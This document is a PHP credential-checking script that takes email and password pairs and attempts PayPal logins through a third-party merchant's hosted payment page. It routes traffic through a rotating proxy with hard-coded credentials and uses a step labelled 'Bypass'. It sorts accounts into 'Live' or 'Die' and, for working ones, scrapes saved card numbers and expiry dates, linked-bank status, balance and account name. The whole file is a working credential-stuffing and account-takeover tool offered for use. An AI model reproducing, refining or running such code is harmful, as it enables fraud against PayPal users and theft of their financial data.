<?php

error_reporting(0);
set_time_limit(0);

extract($_GET);
$linha = explode("|", $lista);
list($email, $senha) = $linha;

if(strlen($senha) < 8){    echo  'Die | ' . $email . ' | ' . $senha . ' | SENHA INVALIDA'; exit;}

function __curl($url = true, $post = true, $headers = true, $usarproxy = true) {
 
$username = 'lum-customer-hl_ea29f859-zone-static';
$password = '89bjkg6eqhn1';
    $port = 22225;
    $session = mt_rand();
    $super_proxy = 'zproxy.luminati.io';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    if ($usarproxy) {
        curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
    }
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie_checker.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie_checker.txt');
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    if ($headers) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    $exec = curl_exec($ch);
    return $exec;
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function limpar(){
    file_exists(getcwd().'/cookie_checker.txt') ? unlink(getcwd().'/cookie_checker.txt') : null;
    return true;
}



$basico = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
    "Referer: https://securepayments.paypal.com/webapps/HostedSoleSolutionApp/webflow/sparta/hostedSoleSolutionProcess",
    "Origin: https://securepayments.paypal.com",
    "Upgrade-Insecure-Requests: 1",
    "Connection: keep-alive",
    "Host: www.paypal.com"
];

$d2 = __curl("https://securepayments.paypal.com/webapps/HostedSoleSolutionApp/webflow/sparta/hostedSoleSolutionProcess", "cmd=_hosted-payment&subtotal=250&business=QL7PHPD4VTCCE&paymentaction=sale&cancel_return=http%3A%2F%2Fonline.corsicecop.it&currency_code=EUR&lc=IT&custom=v5&item_name=CORSO+DI+INFORMATICA+DI+BASE&METHOD.x=91&METHOD.y=19&METHOD=Pay", array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Referer: http://online.corsicecop.it/index.php/corsi-online/26-corso-di-cocktail", "Origin: http://online.corsicecop.it", "Upgrade-Insecure-Requests: 1", "Connection: keep-alive", "Host: securepayments.paypal.com"), true);
$internal_sess = urldecode(inStr($d2, '<input id="internalSessionId" name="internalSessionId" value="', '"', 1));
$csrf = urldecode(inStr($d2, 'input name="_csrf" id="_csrf" value="', '"', 1));
$wps = __curl("https://www.paypal.com/hostedpaymentnodeweb/wps", "internalSessionId=HSS-4c651556e09c0ca3835dff4bd382693dd6e47c74&_csrf=roRJqXb1AJX94M%2BTg9ezz59aW%2Fh8M%2BnyJD2hg%3D&csrf=roRJqXb1AJX94M%2BTg9ezz59aW%2Fh8M%2BnyJD2hg%3D&_eventId_paywithpaypal.x=95&_eventId_paywithpaypal.y=30&sparta_hosted_button=paywithpaypal", array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding: gzip, deflate, br", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Referer: https://securepayments.paypal.com/webapps/HostedSoleSolutionApp/webflow/sparta/hostedSoleSolutionProcess", "Origin: https://securepayments.paypal.com", "Upgrade-Insecure-Requests: 1", "Connection: keep-alive", "Host: www.paypal.com"), true);
$d3 = gzdecode(__curl("https://www.paypal.com/cgi-bin/webscr?cmd=_hssnode-merchantpaymentweb", "amount=99.00&shipping=0.00&handling=0.00&tax=0&business=QL7PHPD4VTCCE&currency_code=EUR&custom=v6&lc=IT&return=http%3A%2F%2Fcorsi.corsicecop.it%2Fconferma.php&cancel_return=http%3A%2F%2Fonline.corsicecop.it&paymentaction=sale&address_override=0&rm=2&no_shipping=1", array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Cache-Control: max-age=0", "Accept-Encoding: gzip, deflate, br", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Content-Type: application/x-www-form-urlencoded", "Referer: https://www.paypal.com/hostedpaymentnodeweb/wps", "Origin: https://www.paypal.com", "Upgrade-Insecure-Requests: 1", "Connection: keep-alive", "Host: www.paypal.com"), true));
$session = html_entity_decode(inStr($d3, '<input type="hidden" id="currentSession" name="currentSession" value="', '"', 1));
$session2 = html_entity_decode(inStr($d3, 'input type="hidden" id="pageSession" name="SESSION" value="', '"', 1));
$context = html_entity_decode(inStr($d3, 'id="CONTEXT_CGI_VAR" name="CONTEXT" value="', '"', 1));
$auth = html_entity_decode(inStr($d3, '<input name="auth" type="hidden" value="', '"', 1));
$signature = inStr($d3, '<input name="rapidsStateSignature" type="hidden" value="', '"', 1);
$select_login = __curl("https://www.paypal.com/it/cgi-bin/merchantpaymentweb?dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024", "cmd=_flow&myAllTextSubmitID=&login_button=Paga%20con%20il%20tuo%20conto%20PayPal&wps_ads_enabled_flow=yes&reviewPgReturn=1&pageTitle=Paga%20con%20una%20carta%20di%20credito%2C%20di%20debito%20(bancomat)%20o%20prepagata&font_option=font_normal&currentSession=$session&pageState=billing&currentDispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&refresh_country_code=0&country_code=IT&cc_brand=&credit_card_type=V&cc_number=&expdate_month=&expdate_year=&cvv2_number=&cc_country_code=IT&cc_brand=&cc_disable_highlighting=true&shadow_bank_acct_routing_number=&shadow_bank_acct_account_number=&shadow_cc_number=&first_name=&last_name=&address1=&address2=&zip=&city=&state=&H_PhoneNumber=&email=&signUpButtonLabelexpd=Accetta%20e%20continua&signUpButtonLabelcol=Rivedi%20e%20continua&back-button-form-fields=&javascript_enabled=true&SESSION=$session2&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&pageServerName=merchantpaymentweb&CONTEXT=$context&cmd=_flow&id=&note=&close_external_flow=false&external_close_account_payment_flow=payment_flow&auth=$auth&rapidsState=OneX__StandardFlowOneX___StateOneXLogin&rapidsStateSignature=$signature&form_charset=UTF-8&view_requested=MiniPage", array("Cache-Control: no-store, no-cache, must-revalidate", "Accept: */*", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Origin: https://www.paypal.com", "Connection: keep-alive", "Host: www.paypal.com"), true);

/* Bypass */
$dados_inserir = [
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: no-store, no-cache, must-revalidate',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.paypal.com',
    'cookie: cookie_check=yes;',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'
];


$d4 = __curl("https://www.paypal.com/it/cgi-bin/webscr?cmd=_flow&SESSION=$session2&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&rapidsState=OneX__StandardFlowOneX___StateOneXLogin&rapidsStateSignature=$signature#pageState=login&pageDispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&pageSession=$session2", false, array("Cookie: cookie_check=yes;login_email=$email"), true);
$session = html_entity_decode(inStr($d4, 'id="currentSession" name="currentSession" value="', '"', 1));
$session2 = html_entity_decode(inStr($d4, '<input type="hidden" id="pageSession" name="SESSION" value="', '"', 1));
$context = html_entity_decode(inStr($d4, 'name="CONTEXT" value="', '"', 1));
$auth = html_entity_decode(inStr($d4, '<input name="auth" type="hidden" value="', '"', 1));

$login = gzdecode(__curl("https://www.paypal.com/it/cgi-bin/merchantpaymentweb?dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024", "cmd=_flow&myAllTextSubmitID=&login.x=Accedi&reviewPgReturn=1&pageTitle=Paga%20con%20un%20conto%20PayPal&wps_ads_enabled_flow=yes&font_option=font_normal&currentSession=$session&pageState=login&currentDispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&email_recovery=false&password_recovery=false&login_email=$email&login_password=$senha&SESSION=$session2&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&CONTEXT=$context&cmd=_flow&id=&close_external_flow=false&external_close_account_payment_flow=payment_flow&auth=AT0okAljfX3SAU5mUQ8-ufS5QKIo9dwLV7nWoTAj2ultZIDLhdJ893TzLC3o3a066&rapidsState=OneX__StandardFlowOneX___StateOneXBilling&rapidsStateSignature=$signature&form_charset=UTF-8&view_requested=MiniPage", array("Cache-Control: no-store, no-cache, must-revalidate", "Accept: */*", "Accept-Encoding: gzip, deflate, br", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Origin: https://www.paypal.com", "Connection: keep-alive", "Host: www.paypal.com", "Cookie: cookie_check=yes;login_email=$email;LANG=it_IT%3bIT;navcmd=_hssnode-merchantpaymentweb;tsrce=hostedpaymentnodeweb"), true));
if (strpos($login, "authflow") !== false) {
    echo' Live! | ' . $email . ' | ' . $senha . ' | Security Questions ';
    if (file_exists("$cookie.txt")) {
        unlink("$cookie.txt");
    }
    die();
}
$home = __curl("https://www.paypal.com/myaccount/", false, false, true);

if (strpos($home, 'link_mobileLogout') !== false) {
    $resultado = array();
    $resultado[] = (strpos($home, 'Reserve um momento para confirmar') !== false) ? "Unverified Email" : "Email Verified";

    /* Capturar Cartões */
    $cc = [];
    $d5 = __curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2", false, false, true);
    $cartoes_total = substr_count($d5, '<tr>');
    if ($cartoes_total > 1) {
        for ($i = 2; $i <= $cartoes_total; $i++) {
            $tabela_card = inStr($d5, '<tr>', '</tr>', $i);
            $imagem_bandeira = html_entity_decode(inStr($tabela_card, '<img src="', '"', 1));
            $type = ucfirst(inStr($imagem_bandeira, '/icon/icon_', '.', 1));
            $ccnum = inStr($tabela_card, '<span class="restricted">', '<', 1);
            $exp = inStr($tabela_card, '<span class="restricted">', '<', 2);
            $cc[] = "$type [$ccnum $exp]";
        }
        if (count($cc) >= 1) {
            $infocard = "Cards: " . implode(" - ", $cc);
        } else {
            $infocard = "No Card";
        }
        $resultado[] = $infocard;
    }
    /* Informações Bancarias */
    $info_bank = __curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1", false, false, true);
    if (strpos($info_bank, "ach_id") !== false) {
        $resa = "Have Bank";
    } else {
        $resa = "No Bank";
    }
    $saldo = inStr($home, '<li class="currenciesEntry vx_small-text enforceLtr">', '<', 1);
    $resultado[] = $saldo;
    $resultado[] = $resa;
    /* Informações */
    $profile = __curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3", false, false, true);
    $name = "Name: " . inStr($profile, '_globalNav-displayName">', '<', 1);
    $resultado[] = $name;
    /* Exibir resultado */
    echo 'Live!  ' . $email . ' | ' . $senha . ' | ' . implode(" | ", $resultado) . ' ';

} else {
    echo  'Die | ' . $email . ' | ' . $senha . '';
}

limpar();
